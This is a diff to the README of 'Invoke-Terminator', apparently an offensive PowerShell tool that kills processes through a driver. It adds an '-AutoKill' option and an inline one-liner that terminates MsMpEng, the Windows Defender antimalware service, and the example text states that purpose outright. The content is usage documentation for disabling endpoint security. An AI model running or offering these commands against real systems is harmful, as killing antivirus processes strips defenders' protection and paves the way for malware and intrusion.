@@ -28,9 +28,14 @@ twitter: twitter.com/xiosec
     * -ProcName
     * -ProcId
     * -driverPath
+    * -AutoKill
 #>
 
 Invoke-Terminator -ServiceName terminator -ProcName MsMpEng 
+```
+> inline
+```powershell
+powershell -c ". .\Invoke-Terminator.ps1; Invoke-Terminator -ProcName MsMpEng -AutoKill"
 ```
 # Example
 In this example, we kill the `MsMpEng` process, which is related to the `antimalware service`.
